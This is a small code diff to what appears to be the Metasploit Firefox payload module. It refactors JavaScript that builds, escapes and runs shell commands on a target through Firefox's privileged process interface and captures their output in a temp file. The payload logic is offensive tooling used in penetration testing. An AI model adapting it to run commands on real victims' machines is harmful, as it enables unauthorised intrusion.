@@ -169,12 +169,13 @@ module Msf::Payload::Firefox
           .get("TmpD", Components.interfaces.nsIFile);
         stdout.append(stdoutFile);
 
+        var shell;
         if (windows) {
-          var shell = shPath+" "+cmd;
+          shell = shPath+" "+cmd.trim();
           shell = shPath+" "+shell.replace(/\\W/g, shEsc)+" >"+stdout.path+" 2>&1";
           var b64 = svcs.btoa(shell);
         } else {
-          var shell = shPath+" "+cmd.replace(/\\W/g, shEsc);
+          shell = shPath+" "+cmd.replace(/\\W/g, shEsc);
           shell = shPath+" "+shell.replace(/\\W/g, shEsc) + " >"+stdout.path+" 2>&1";
         }
         var process = Components.classes["@mozilla.org/process/util;1"]
